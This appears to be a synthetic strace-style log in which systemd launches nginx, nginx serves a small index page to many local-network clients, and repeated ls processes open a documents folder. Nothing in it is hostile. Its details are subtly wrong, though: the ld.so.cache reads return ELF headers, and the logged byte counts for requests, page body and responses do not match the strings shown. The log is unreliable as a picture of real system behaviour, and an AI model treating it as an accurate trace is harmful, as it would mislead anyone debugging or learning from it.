[pid 1000] execve("/usr/sbin/systemd", ["systemd"], 0x7fffc2c935f0) = 0
[pid 1000] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 1000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 1000] close(3) = 0
[pid 1000] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 1000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 1000] close(3) = 0
[pid 1000] fork() = 1001
[pid 1001] execve("/usr/bin/nginx", ["nginx"], 0x7fffc2c935f0) = 0
[pid 1001] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 1001] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 1001] close(3) = 0
[pid 1001] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 1001] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 1001] close(3) = 0
[pid 1001] socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
[pid 1001] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
[pid 1001] listen(3, 511) = 0
[pid 3000] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3000] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3000] close(3) = 0
[pid 3000] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3000] close(3) = 0
[pid 3000] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3000] close(3) = 0
[pid 3001] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3001] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3001] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3001] close(3) = 0
[pid 3001] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3001] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3001] close(3) = 0
[pid 3001] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3001] close(3) = 0
[pid 3002] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3002] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3002] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3002] close(3) = 0
[pid 3002] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3002] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3002] close(3) = 0
[pid 3002] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3002] close(3) = 0
[pid 3003] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3003] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3003] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3003] close(3) = 0
[pid 3003] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3003] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3003] close(3) = 0
[pid 3003] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3003] close(3) = 0
[pid 3004] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3004] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3004] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3004] close(3) = 0
[pid 3004] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3004] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3004] close(3) = 0
[pid 3004] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3004] close(3) = 0
[pid 3005] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3005] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3005] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3005] close(3) = 0
[pid 3005] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3005] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3005] close(3) = 0
[pid 3005] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3005] close(3) = 0
[pid 3006] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3006] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3006] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3006] close(3) = 0
[pid 3006] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3006] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3006] close(3) = 0
[pid 3006] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3006] close(3) = 0
[pid 3007] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3007] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3007] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3007] close(3) = 0
[pid 3007] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3007] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3007] close(3) = 0
[pid 3007] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3007] close(3) = 0
[pid 3008] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3008] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3008] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3008] close(3) = 0
[pid 3008] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3008] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3008] close(3) = 0
[pid 3008] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3008] close(3) = 0
[pid 3009] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3009] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3009] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3009] close(3) = 0
[pid 3009] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3009] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3009] close(3) = 0
[pid 3009] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3009] close(3) = 0
[pid 3010] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3010] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3010] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3010] close(3) = 0
[pid 3010] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3010] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3010] close(3) = 0
[pid 3010] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3010] close(3) = 0
[pid 3011] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3011] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3011] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3011] close(3) = 0
[pid 3011] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3011] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3011] close(3) = 0
[pid 3011] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3011] close(3) = 0
[pid 3012] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3012] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3012] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3012] close(3) = 0
[pid 3012] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3012] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3012] close(3) = 0
[pid 3012] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3012] close(3) = 0
[pid 3013] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3013] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3013] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3013] close(3) = 0
[pid 3013] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3013] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3013] close(3) = 0
[pid 3013] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3013] close(3) = 0
[pid 3014] execve("/bin/ls", ["ls"], 0x7fffc2c935f0) = 0
[pid 3014] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3014] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3014] close(3) = 0
[pid 3014] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3014] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3014] close(3) = 0
[pid 3014] openat(AT_FDCWD, "/home/user/documents", O_RDONLY) = 3
[pid 3014] close(3) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(58143), sin_addr=inet_addr("192.168.1.101")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(56716), sin_addr=inet_addr("192.168.1.194")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(64150), sin_addr=inet_addr("192.168.1.144")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(51116), sin_addr=inet_addr("192.168.1.198")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(60806), sin_addr=inet_addr("192.168.1.172")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(55602), sin_addr=inet_addr("192.168.1.153")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(53030), sin_addr=inet_addr("192.168.1.191")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(58993), sin_addr=inet_addr("192.168.1.186")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(57973), sin_addr=inet_addr("192.168.1.111")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(52432), sin_addr=inet_addr("192.168.1.124")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(58351), sin_addr=inet_addr("192.168.1.100")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(61059), sin_addr=inet_addr("192.168.1.187")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(54358), sin_addr=inet_addr("192.168.1.108")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(59640), sin_addr=inet_addr("192.168.1.110")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(59637), sin_addr=inet_addr("192.168.1.153")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(64781), sin_addr=inet_addr("192.168.1.113")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(55593), sin_addr=inet_addr("192.168.1.197")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(49762), sin_addr=inet_addr("192.168.1.147")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(55921), sin_addr=inet_addr("192.168.1.147")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(62990), sin_addr=inet_addr("192.168.1.103")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(51795), sin_addr=inet_addr("192.168.1.158")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(61816), sin_addr=inet_addr("192.168.1.107")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(49153), sin_addr=inet_addr("192.168.1.130")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(61116), sin_addr=inet_addr("192.168.1.128")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(59387), sin_addr=inet_addr("192.168.1.195")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(57627), sin_addr=inet_addr("192.168.1.175")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(59922), sin_addr=inet_addr("192.168.1.140")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(50854), sin_addr=inet_addr("192.168.1.174")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(65073), sin_addr=inet_addr("192.168.1.126")}, 16) = 4
